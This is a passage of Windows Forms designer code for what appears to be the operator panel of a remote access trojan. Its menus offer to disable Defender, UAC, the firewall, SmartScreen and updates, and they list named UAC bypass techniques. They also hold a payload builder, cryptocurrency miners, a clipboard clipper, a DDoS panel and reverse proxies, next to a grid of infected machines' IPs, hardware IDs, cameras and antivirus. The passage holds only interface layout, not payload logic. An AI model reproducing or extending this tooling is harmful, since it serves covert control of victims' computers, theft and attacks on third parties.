		this.toolStripMenuItem21.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.toolStripMenuItem22, this.toolStripMenuItem23 });
		this.toolStripMenuItem21.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem21.Image");
		this.toolStripMenuItem21.Name = "toolStripMenuItem21";
		this.toolStripMenuItem21.Size = new System.Drawing.Size(188, 22);
		this.toolStripMenuItem21.Text = "Win+R";
		this.toolStripMenuItem22.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem22.Image");
		this.toolStripMenuItem22.Name = "toolStripMenuItem22";
		this.toolStripMenuItem22.Size = new System.Drawing.Size(117, 22);
		this.toolStripMenuItem22.Text = "Enable";
		this.toolStripMenuItem22.Click += new System.EventHandler(toolStripMenuItem22_Click);
		this.toolStripMenuItem23.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem23.Image");
		this.toolStripMenuItem23.Name = "toolStripMenuItem23";
		this.toolStripMenuItem23.Size = new System.Drawing.Size(117, 22);
		this.toolStripMenuItem23.Text = "Disable";
		this.toolStripMenuItem23.Click += new System.EventHandler(toolStripMenuItem23_Click);
		this.sToolStripMenuItem10.Name = "sToolStripMenuItem10";
		this.sToolStripMenuItem10.Size = new System.Drawing.Size(185, 6);
		this.toolStripMenuItem27.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.toolStripMenuItem28, this.toolStripMenuItem29 });
		this.toolStripMenuItem27.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem27.Image");
		this.toolStripMenuItem27.Name = "toolStripMenuItem27";
		this.toolStripMenuItem27.Size = new System.Drawing.Size(188, 22);
		this.toolStripMenuItem27.Text = "Defender";
		this.toolStripMenuItem28.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem28.Image");
		this.toolStripMenuItem28.Name = "toolStripMenuItem28";
		this.toolStripMenuItem28.Size = new System.Drawing.Size(117, 22);
		this.toolStripMenuItem28.Text = "Enable";
		this.toolStripMenuItem28.Click += new System.EventHandler(toolStripMenuItem28_Click);
		this.toolStripMenuItem29.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem29.Image");
		this.toolStripMenuItem29.Name = "toolStripMenuItem29";
		this.toolStripMenuItem29.Size = new System.Drawing.Size(117, 22);
		this.toolStripMenuItem29.Text = "Disable";
		this.toolStripMenuItem29.Click += new System.EventHandler(toolStripMenuItem29_Click);
		this.toolStripMenuItem4.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.toolStripMenuItem7, this.toolStripMenuItem8 });
		this.toolStripMenuItem4.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem4.Image");
		this.toolStripMenuItem4.Name = "toolStripMenuItem4";
		this.toolStripMenuItem4.Size = new System.Drawing.Size(188, 22);
		this.toolStripMenuItem4.Text = "Uac";
		this.toolStripMenuItem7.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem7.Image");
		this.toolStripMenuItem7.Name = "toolStripMenuItem7";
		this.toolStripMenuItem7.Size = new System.Drawing.Size(117, 22);
		this.toolStripMenuItem7.Text = "Enable";
		this.toolStripMenuItem7.Click += new System.EventHandler(toolStripMenuItem7_Click);
		this.toolStripMenuItem8.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem8.Image");
		this.toolStripMenuItem8.Name = "toolStripMenuItem8";
		this.toolStripMenuItem8.Size = new System.Drawing.Size(117, 22);
		this.toolStripMenuItem8.Text = "Disable";
		this.toolStripMenuItem8.Click += new System.EventHandler(toolStripMenuItem8_Click);
		this.toolStripMenuItem18.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.toolStripMenuItem19, this.toolStripMenuItem20 });
		this.toolStripMenuItem18.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem18.Image");
		this.toolStripMenuItem18.Name = "toolStripMenuItem18";
		this.toolStripMenuItem18.Size = new System.Drawing.Size(188, 22);
		this.toolStripMenuItem18.Text = "Firewall";
		this.toolStripMenuItem19.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem19.Image");
		this.toolStripMenuItem19.Name = "toolStripMenuItem19";
		this.toolStripMenuItem19.Size = new System.Drawing.Size(117, 22);
		this.toolStripMenuItem19.Text = "Enable";
		this.toolStripMenuItem19.Click += new System.EventHandler(toolStripMenuItem19_Click);
		this.toolStripMenuItem20.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem20.Image");
		this.toolStripMenuItem20.Name = "toolStripMenuItem20";
		this.toolStripMenuItem20.Size = new System.Drawing.Size(117, 22);
		this.toolStripMenuItem20.Text = "Disable";
		this.toolStripMenuItem20.Click += new System.EventHandler(toolStripMenuItem20_Click);
		this.toolStripMenuItem31.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.toolStripMenuItem32, this.toolStripMenuItem33 });
		this.toolStripMenuItem31.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem31.Image");
		this.toolStripMenuItem31.Name = "toolStripMenuItem31";
		this.toolStripMenuItem31.Size = new System.Drawing.Size(188, 22);
		this.toolStripMenuItem31.Text = "Smart Screen";
		this.toolStripMenuItem32.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem32.Image");
		this.toolStripMenuItem32.Name = "toolStripMenuItem32";
		this.toolStripMenuItem32.Size = new System.Drawing.Size(117, 22);
		this.toolStripMenuItem32.Text = "Enable";
		this.toolStripMenuItem32.Click += new System.EventHandler(toolStripMenuItem32_Click);
		this.toolStripMenuItem33.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem33.Image");
		this.toolStripMenuItem33.Name = "toolStripMenuItem33";
		this.toolStripMenuItem33.Size = new System.Drawing.Size(117, 22);
		this.toolStripMenuItem33.Text = "Disable";
		this.toolStripMenuItem33.Click += new System.EventHandler(toolStripMenuItem33_Click);
		this.toolStripMenuItem24.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.toolStripMenuItem25, this.toolStripMenuItem26 });
		this.toolStripMenuItem24.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem24.Image");
		this.toolStripMenuItem24.Name = "toolStripMenuItem24";
		this.toolStripMenuItem24.Size = new System.Drawing.Size(188, 22);
		this.toolStripMenuItem24.Text = "Update";
		this.toolStripMenuItem25.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem25.Image");
		this.toolStripMenuItem25.Name = "toolStripMenuItem25";
		this.toolStripMenuItem25.Size = new System.Drawing.Size(117, 22);
		this.toolStripMenuItem25.Text = "Enable";
		this.toolStripMenuItem25.Click += new System.EventHandler(toolStripMenuItem25_Click);
		this.toolStripMenuItem26.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem26.Image");
		this.toolStripMenuItem26.Name = "toolStripMenuItem26";
		this.toolStripMenuItem26.Size = new System.Drawing.Size(117, 22);
		this.toolStripMenuItem26.Text = "Disable";
		this.toolStripMenuItem26.Click += new System.EventHandler(toolStripMenuItem26_Click);
		this.bypassUacToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[9] { this.runAsAdminUacToolStripMenuItem, this.runAsSystemToolStripMenuItem, this.sToolStripMenuItem7, this.eventvwrToolStripMenuItem, this.fodhelperToolStripMenuItem, this.computerdefaultsToolStripMenuItem, this.sDCLTToolStripMenuItem, this.sLUIToolStripMenuItem, this.diskCleanupToolStripMenuItem });
		this.bypassUacToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("bypassUacToolStripMenuItem1.Image");
		this.bypassUacToolStripMenuItem1.Name = "bypassUacToolStripMenuItem1";
		this.bypassUacToolStripMenuItem1.Size = new System.Drawing.Size(177, 22);
		this.bypassUacToolStripMenuItem1.Text = "Uac";
		this.runAsAdminUacToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.runAsAdminUacToolStripMenuItem.ForeColor = System.Drawing.Color.Black;
		this.runAsAdminUacToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("runAsAdminUacToolStripMenuItem.Image");
		this.runAsAdminUacToolStripMenuItem.Name = "runAsAdminUacToolStripMenuItem";
		this.runAsAdminUacToolStripMenuItem.Size = new System.Drawing.Size(175, 22);
		this.runAsAdminUacToolStripMenuItem.Text = "Run As Admin Uac";
		this.runAsAdminUacToolStripMenuItem.Click += new System.EventHandler(runAsAdminUacToolStripMenuItem_Click);
		this.runAsSystemToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.runAsSystemToolStripMenuItem.ForeColor = System.Drawing.Color.Black;
		this.runAsSystemToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("runAsSystemToolStripMenuItem.Image");
		this.runAsSystemToolStripMenuItem.Name = "runAsSystemToolStripMenuItem";
		this.runAsSystemToolStripMenuItem.Size = new System.Drawing.Size(175, 22);
		this.runAsSystemToolStripMenuItem.Text = "Run As System";
		this.runAsSystemToolStripMenuItem.Click += new System.EventHandler(runAsSystemToolStripMenuItem_Click);
		this.sToolStripMenuItem7.Name = "sToolStripMenuItem7";
		this.sToolStripMenuItem7.Size = new System.Drawing.Size(172, 6);
		this.eventvwrToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.eventvwrToolStripMenuItem.ForeColor = System.Drawing.Color.Black;
		this.eventvwrToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("eventvwrToolStripMenuItem.Image");
		this.eventvwrToolStripMenuItem.Name = "eventvwrToolStripMenuItem";
		this.eventvwrToolStripMenuItem.Size = new System.Drawing.Size(175, 22);
		this.eventvwrToolStripMenuItem.Text = "Eventvwr";
		this.eventvwrToolStripMenuItem.Click += new System.EventHandler(eventvwrToolStripMenuItem_Click);
		this.fodhelperToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.fodhelperToolStripMenuItem.ForeColor = System.Drawing.Color.Black;
		this.fodhelperToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("fodhelperToolStripMenuItem.Image");
		this.fodhelperToolStripMenuItem.Name = "fodhelperToolStripMenuItem";
		this.fodhelperToolStripMenuItem.Size = new System.Drawing.Size(175, 22);
		this.fodhelperToolStripMenuItem.Text = "Fodhelper";
		this.fodhelperToolStripMenuItem.Click += new System.EventHandler(fodhelperToolStripMenuItem_Click);
		this.computerdefaultsToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.computerdefaultsToolStripMenuItem.ForeColor = System.Drawing.Color.Black;
		this.computerdefaultsToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("computerdefaultsToolStripMenuItem.Image");
		this.computerdefaultsToolStripMenuItem.Name = "computerdefaultsToolStripMenuItem";
		this.computerdefaultsToolStripMenuItem.Size = new System.Drawing.Size(175, 22);
		this.computerdefaultsToolStripMenuItem.Text = "Computerdefaults";
		this.computerdefaultsToolStripMenuItem.Click += new System.EventHandler(computerdefaultsToolStripMenuItem_Click);
		this.sDCLTToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.sDCLTToolStripMenuItem.ForeColor = System.Drawing.Color.Black;
		this.sDCLTToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("sDCLTToolStripMenuItem.Image");
		this.sDCLTToolStripMenuItem.Name = "sDCLTToolStripMenuItem";
		this.sDCLTToolStripMenuItem.Size = new System.Drawing.Size(175, 22);
		this.sDCLTToolStripMenuItem.Text = "SDCLT";
		this.sDCLTToolStripMenuItem.Click += new System.EventHandler(sDCLTToolStripMenuItem_Click);
		this.sLUIToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.sLUIToolStripMenuItem.ForeColor = System.Drawing.Color.Black;
		this.sLUIToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("sLUIToolStripMenuItem.Image");
		this.sLUIToolStripMenuItem.Name = "sLUIToolStripMenuItem";
		this.sLUIToolStripMenuItem.Size = new System.Drawing.Size(175, 22);
		this.sLUIToolStripMenuItem.Text = "SLUI";
		this.sLUIToolStripMenuItem.Click += new System.EventHandler(sLUIToolStripMenuItem_Click);
		this.diskCleanupToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.diskCleanupToolStripMenuItem.ForeColor = System.Drawing.Color.Black;
		this.diskCleanupToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("diskCleanupToolStripMenuItem.Image");
		this.diskCleanupToolStripMenuItem.Name = "diskCleanupToolStripMenuItem";
		this.diskCleanupToolStripMenuItem.Size = new System.Drawing.Size(175, 22);
		this.diskCleanupToolStripMenuItem.Text = "DiskCleanup";
		this.diskCleanupToolStripMenuItem.Click += new System.EventHandler(diskCleanupToolStripMenuItem_Click);
		this.systemControlToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.exitToolStripMenuItem, this.systemToolStripMenuItem });
		this.systemControlToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("systemControlToolStripMenuItem.Image");
		this.systemControlToolStripMenuItem.Name = "systemControlToolStripMenuItem";
		this.systemControlToolStripMenuItem.Size = new System.Drawing.Size(177, 22);
		this.systemControlToolStripMenuItem.Text = "System Control";
		this.exitToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[5] { this.exitToolStripMenuItem2, this.updateToolStripMenuItem, this.restartToolStripMenuItem, this.uninstallToolStripMenuItem, this.disconnectToolStripMenuItem });
		this.exitToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("exitToolStripMenuItem.Image");
		this.exitToolStripMenuItem.Name = "exitToolStripMenuItem";
		this.exitToolStripMenuItem.Size = new System.Drawing.Size(115, 22);
		this.exitToolStripMenuItem.Text = "Client";
		this.exitToolStripMenuItem2.Image = (System.Drawing.Image)resources.GetObject("exitToolStripMenuItem2.Image");
		this.exitToolStripMenuItem2.Name = "exitToolStripMenuItem2";
		this.exitToolStripMenuItem2.Size = new System.Drawing.Size(136, 22);
		this.exitToolStripMenuItem2.Text = "Exit";
		this.exitToolStripMenuItem2.Click += new System.EventHandler(exitToolStripMenuItem2_Click);
		this.updateToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("updateToolStripMenuItem.Image");
		this.updateToolStripMenuItem.Name = "updateToolStripMenuItem";
		this.updateToolStripMenuItem.Size = new System.Drawing.Size(136, 22);
		this.updateToolStripMenuItem.Text = "Update";
		this.updateToolStripMenuItem.Click += new System.EventHandler(updateToolStripMenuItem_Click);
		this.restartToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("restartToolStripMenuItem.Image");
		this.restartToolStripMenuItem.Name = "restartToolStripMenuItem";
		this.restartToolStripMenuItem.Size = new System.Drawing.Size(136, 22);
		this.restartToolStripMenuItem.Text = "Restart";
		this.restartToolStripMenuItem.Click += new System.EventHandler(restartToolStripMenuItem_Click);
		this.uninstallToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("uninstallToolStripMenuItem.Image");
		this.uninstallToolStripMenuItem.Name = "uninstallToolStripMenuItem";
		this.uninstallToolStripMenuItem.Size = new System.Drawing.Size(136, 22);
		this.uninstallToolStripMenuItem.Text = "Uninstall";
		this.uninstallToolStripMenuItem.Click += new System.EventHandler(uninstallToolStripMenuItem_Click);
		this.disconnectToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("disconnectToolStripMenuItem.Image");
		this.disconnectToolStripMenuItem.Name = "disconnectToolStripMenuItem";
		this.disconnectToolStripMenuItem.Size = new System.Drawing.Size(136, 22);
		this.disconnectToolStripMenuItem.Text = "Disconnect";
		this.disconnectToolStripMenuItem.Click += new System.EventHandler(disconnectToolStripMenuItem_Click);
		this.systemToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.shutdownToolStripMenuItem, this.restartToolStripMenuItem1, this.logOutToolStripMenuItem });
		this.systemToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("systemToolStripMenuItem.Image");
		this.systemToolStripMenuItem.Name = "systemToolStripMenuItem";
		this.systemToolStripMenuItem.Size = new System.Drawing.Size(115, 22);
		this.systemToolStripMenuItem.Text = "System";
		this.shutdownToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("shutdownToolStripMenuItem.Image");
		this.shutdownToolStripMenuItem.Name = "shutdownToolStripMenuItem";
		this.shutdownToolStripMenuItem.Size = new System.Drawing.Size(129, 22);
		this.shutdownToolStripMenuItem.Text = "Shutdown";
		this.shutdownToolStripMenuItem.Click += new System.EventHandler(shutdownToolStripMenuItem_Click);
		this.restartToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("restartToolStripMenuItem1.Image");
		this.restartToolStripMenuItem1.Name = "restartToolStripMenuItem1";
		this.restartToolStripMenuItem1.Size = new System.Drawing.Size(129, 22);
		this.restartToolStripMenuItem1.Text = "Restart";
		this.restartToolStripMenuItem1.Click += new System.EventHandler(restartToolStripMenuItem1_Click);
		this.logOutToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("logOutToolStripMenuItem.Image");
		this.logOutToolStripMenuItem.Name = "logOutToolStripMenuItem";
		this.logOutToolStripMenuItem.Size = new System.Drawing.Size(129, 22);
		this.logOutToolStripMenuItem.Text = "LogOut";
		this.logOutToolStripMenuItem.Click += new System.EventHandler(logOutToolStripMenuItem_Click);
		this.sToolStripMenuItem8.Name = "sToolStripMenuItem8";
		this.sToolStripMenuItem8.Size = new System.Drawing.Size(174, 6);
		this.openClientFolderToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("openClientFolderToolStripMenuItem.Image");
		this.openClientFolderToolStripMenuItem.Name = "openClientFolderToolStripMenuItem";
		this.openClientFolderToolStripMenuItem.Size = new System.Drawing.Size(177, 22);
		this.openClientFolderToolStripMenuItem.Text = "Open Client Folder";
		this.openClientFolderToolStripMenuItem.Click += new System.EventHandler(openClientFolderToolStripMenuItem_Click);
		this.copyRecoveryToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("copyRecoveryToolStripMenuItem.Image");
		this.copyRecoveryToolStripMenuItem.Name = "copyRecoveryToolStripMenuItem";
		this.copyRecoveryToolStripMenuItem.Size = new System.Drawing.Size(177, 22);
		this.copyRecoveryToolStripMenuItem.Text = "Copy Recovery";
		this.copyRecoveryToolStripMenuItem.Click += new System.EventHandler(copyRecoveryToolStripMenuItem_Click);
		this.noteToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("noteToolStripMenuItem.Image");
		this.noteToolStripMenuItem.Name = "noteToolStripMenuItem";
		this.noteToolStripMenuItem.Size = new System.Drawing.Size(177, 22);
		this.noteToolStripMenuItem.Text = "Note";
		this.noteToolStripMenuItem.Click += new System.EventHandler(noteToolStripMenuItem_Click);
		this.MbSecound.Enabled = true;
		this.MbSecound.Interval = 1000;
		this.MbSecound.Tick += new System.EventHandler(MbSecound_Tick);
		this.menuStrip2.BackColor = System.Drawing.Color.White;
		this.menuStrip2.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		this.menuStrip2.Items.AddRange(new System.Windows.Forms.ToolStripItem[14]
		{
			this.dataToolStripMenuItem, this.toolStripMenuItem11, this.toolStripMenuItem12, this.toolStripMenuItem118, this.toolStripMenuItem1, this.toolStripMenuItem13, this.toolStripMenuItem3, this.users0ToolStripMenuItem, this.toolStripMenuItem34, this.connects0ToolStripMenuItem,
			this.sents0mbToolStripMenuItem, this.recives0mbToolStripMenuItem, this.sents0mbsToolStripMenuItem, this.recives0mbsToolStripMenuItem
		});
		this.menuStrip2.Location = new System.Drawing.Point(3, 64);
		this.menuStrip2.Name = "menuStrip2";
		this.menuStrip2.Size = new System.Drawing.Size(1397, 24);
		this.menuStrip2.TabIndex = 3;
		this.menuStrip2.Text = "menuStrip2";
		this.dataToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[12]
		{
			this.buliderToolStripMenuItem2, this.settingsToolStripMenuItem2, this.aboutToolStripMenuItem, this.toolStripMenuItem5, this.minerXMRToolStripMenuItem1, this.minerRigelToolStripMenuItem, this.clipperPanelToolStripMenuItem, this.dDOSPanelToolStripMenuItem1, this.proxyRPanelToolStripMenuItem, this.toolStripMenuItem2,
			this.toolStripMenuItem6, this.exitToolStripMenuItem1
		});
		this.dataToolStripMenuItem.Name = "dataToolStripMenuItem";
		this.dataToolStripMenuItem.Size = new System.Drawing.Size(39, 20);
		this.dataToolStripMenuItem.Text = "File";
		this.buliderToolStripMenuItem2.Name = "buliderToolStripMenuItem2";
		this.buliderToolStripMenuItem2.Size = new System.Drawing.Size(149, 22);
		this.buliderToolStripMenuItem2.Text = "Bulider";
		this.buliderToolStripMenuItem2.Click += new System.EventHandler(buliderToolStripMenuItem2_Click);
		this.settingsToolStripMenuItem2.Name = "settingsToolStripMenuItem2";
		this.settingsToolStripMenuItem2.Size = new System.Drawing.Size(149, 22);
		this.settingsToolStripMenuItem2.Text = "Settings";
		this.settingsToolStripMenuItem2.Click += new System.EventHandler(settingsToolStripMenuItem2_Click);
		this.aboutToolStripMenuItem.Name = "aboutToolStripMenuItem";
		this.aboutToolStripMenuItem.Size = new System.Drawing.Size(149, 22);
		this.aboutToolStripMenuItem.Text = "About";
		this.aboutToolStripMenuItem.Click += new System.EventHandler(aboutToolStripMenuItem_Click);
		this.toolStripMenuItem5.Name = "toolStripMenuItem5";
		this.toolStripMenuItem5.Size = new System.Drawing.Size(146, 6);
		this.minerXMRToolStripMenuItem1.Name = "minerXMRToolStripMenuItem1";
		this.minerXMRToolStripMenuItem1.Size = new System.Drawing.Size(149, 22);
		this.minerXMRToolStripMenuItem1.Text = "Miner XMR";
		this.minerXMRToolStripMenuItem1.Click += new System.EventHandler(minerXMRToolStripMenuItem1_Click);
		this.minerRigelToolStripMenuItem.Name = "minerRigelToolStripMenuItem";
		this.minerRigelToolStripMenuItem.Size = new System.Drawing.Size(149, 22);
		this.minerRigelToolStripMenuItem.Text = "Miner etc";
		this.minerRigelToolStripMenuItem.Click += new System.EventHandler(minerRigelToolStripMenuItem_Click);
		this.clipperPanelToolStripMenuItem.Name = "clipperPanelToolStripMenuItem";
		this.clipperPanelToolStripMenuItem.Size = new System.Drawing.Size(149, 22);
		this.clipperPanelToolStripMenuItem.Text = "Clipper Panel";
		this.clipperPanelToolStripMenuItem.Click += new System.EventHandler(clipperPanelToolStripMenuItem_Click);
		this.dDOSPanelToolStripMenuItem1.Name = "dDOSPanelToolStripMenuItem1";
		this.dDOSPanelToolStripMenuItem1.Size = new System.Drawing.Size(149, 22);
		this.dDOSPanelToolStripMenuItem1.Text = "DDOS Panel";
		this.dDOSPanelToolStripMenuItem1.Click += new System.EventHandler(dDOSPanelToolStripMenuItem1_Click);
		this.proxyRPanelToolStripMenuItem.Name = "proxyRPanelToolStripMenuItem";
		this.proxyRPanelToolStripMenuItem.Size = new System.Drawing.Size(149, 22);
		this.proxyRPanelToolStripMenuItem.Text = "Proxy R panel";
		this.proxyRPanelToolStripMenuItem.Click += new System.EventHandler(proxyRPanelToolStripMenuItem_Click);
		this.toolStripMenuItem2.Name = "toolStripMenuItem2";
		this.toolStripMenuItem2.Size = new System.Drawing.Size(149, 22);
		this.toolStripMenuItem2.Text = "Proxy U panel";
		this.toolStripMenuItem2.Click += new System.EventHandler(toolStripMenuItem2_Click);
		this.toolStripMenuItem6.Name = "toolStripMenuItem6";
		this.toolStripMenuItem6.Size = new System.Drawing.Size(146, 6);
		this.exitToolStripMenuItem1.Name = "exitToolStripMenuItem1";
		this.exitToolStripMenuItem1.Size = new System.Drawing.Size(149, 22);
		this.exitToolStripMenuItem1.Text = "Exit";
		this.exitToolStripMenuItem1.Click += new System.EventHandler(exitToolStripMenuItem1_Click);
		this.toolStripMenuItem11.Name = "toolStripMenuItem11";
		this.toolStripMenuItem11.Size = new System.Drawing.Size(87, 20);
		this.toolStripMenuItem11.Text = "   { Online [0]";
		this.toolStripMenuItem12.Name = "toolStripMenuItem12";
		this.toolStripMenuItem12.Size = new System.Drawing.Size(83, 20);
		this.toolStripMenuItem12.Text = "Selected [0]";
		this.toolStripMenuItem118.Name = "toolStripMenuItem118";
		this.toolStripMenuItem118.Size = new System.Drawing.Size(146, 20);
		this.toolStripMenuItem118.Text = "Miners xmrig [Not work]";
		this.toolStripMenuItem1.Name = "toolStripMenuItem1";
		this.toolStripMenuItem1.Size = new System.Drawing.Size(132, 20);
		this.toolStripMenuItem1.Text = "Miners etc [Not work]";
		this.toolStripMenuItem13.Name = "toolStripMenuItem13";
		this.toolStripMenuItem13.Size = new System.Drawing.Size(123, 20);
		this.toolStripMenuItem13.Text = "Clippers [Not work]";
		this.toolStripMenuItem3.Name = "toolStripMenuItem3";
		this.toolStripMenuItem3.Size = new System.Drawing.Size(117, 20);
		this.toolStripMenuItem3.Text = "DDos [Not work]   ";
		this.users0ToolStripMenuItem.Name = "users0ToolStripMenuItem";
		this.users0ToolStripMenuItem.Size = new System.Drawing.Size(178, 20);
		this.users0ToolStripMenuItem.Text = "Reverse Proxy R [Not work]    ";
		this.toolStripMenuItem34.Name = "toolStripMenuItem34";
		this.toolStripMenuItem34.Size = new System.Drawing.Size(182, 20);
		this.toolStripMenuItem34.Text = "Reverse Proxy U [Not work] }   ";
		this.connects0ToolStripMenuItem.Name = "connects0ToolStripMenuItem";
		this.connects0ToolStripMenuItem.Size = new System.Drawing.Size(104, 20);
		this.connects0ToolStripMenuItem.Text = "   { Connects [0]";
		this.sents0mbToolStripMenuItem.Name = "sents0mbToolStripMenuItem";
		this.sents0mbToolStripMenuItem.Size = new System.Drawing.Size(75, 20);
		this.sents0mbToolStripMenuItem.Text = "Sents [0B]";
		this.recives0mbToolStripMenuItem.Name = "recives0mbToolStripMenuItem";
		this.recives0mbToolStripMenuItem.Size = new System.Drawing.Size(87, 20);
		this.recives0mbToolStripMenuItem.Text = "Recives [0B]";
		this.sents0mbsToolStripMenuItem.Name = "sents0mbsToolStripMenuItem";
		this.sents0mbsToolStripMenuItem.Size = new System.Drawing.Size(85, 20);
		this.sents0mbsToolStripMenuItem.Text = "Sents [0B/s]";
		this.recives0mbsToolStripMenuItem.Name = "recives0mbsToolStripMenuItem";
		this.recives0mbsToolStripMenuItem.Size = new System.Drawing.Size(104, 20);
		this.recives0mbsToolStripMenuItem.Text = "Recives [0B/s] }";
		this.panel1.Location = new System.Drawing.Point(0, 64);
		this.panel1.Name = "panel1";
		this.panel1.Size = new System.Drawing.Size(66, 24);
		this.panel1.TabIndex = 4;
		this.materialTabControl1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.materialTabControl1.Controls.Add(this.tabPage1);
		this.materialTabControl1.Controls.Add(this.tabPage2);
		this.materialTabControl1.Controls.Add(this.tabPage3);
		this.materialTabControl1.Depth = 0;
		this.materialTabControl1.Location = new System.Drawing.Point(0, 84);
		this.materialTabControl1.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialTabControl1.Multiline = true;
		this.materialTabControl1.Name = "materialTabControl1";
		this.materialTabControl1.SelectedIndex = 0;
		this.materialTabControl1.Size = new System.Drawing.Size(1403, 507);
		this.materialTabControl1.TabIndex = 1;
		this.tabPage1.Controls.Add(this.GridClients);
		this.tabPage1.Location = new System.Drawing.Point(4, 22);
		this.tabPage1.Name = "tabPage1";
		this.tabPage1.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage1.Size = new System.Drawing.Size(1395, 481);
		this.tabPage1.TabIndex = 0;
		this.tabPage1.Text = "Users";
		this.tabPage1.UseVisualStyleBackColor = true;
		this.GridClients.AllowUserToAddRows = false;
		this.GridClients.AllowUserToDeleteRows = false;
		this.GridClients.AllowUserToResizeColumns = false;
		this.GridClients.AllowUserToResizeRows = false;
		this.GridClients.BackgroundColor = System.Drawing.Color.White;
		this.GridClients.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.GridClients.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.GridClients.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle.Alignment = System.Windows.Forms.DataGridViewContentAlignment.TopLeft;
		dataGridViewCellStyle.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle.SelectionForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.GridClients.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle;
		this.GridClients.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.GridClients.Columns.AddRange(this.Column4, this.ColumnIP, this.ColumnCountry, this.ColumnGroup, this.Column6, this.ColumnHwid, this.ColumnUserPC, this.ColumnCamera, this.ColumnCpu, this.ColumnGpu, this.ColumnOs, this.ColumnAntiVirus, this.ColumnVersion, this.ColumnTimeInstall, this.ColumnPrivilege, this.ColumnPing, this.ColumnWindow);
		this.GridClients.ContextMenuStrip = this.contextMenuStrip1;
		this.GridClients.Cursor = System.Windows.Forms.Cursors.Default;
		dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle2.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		dataGridViewCellStyle2.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.White;
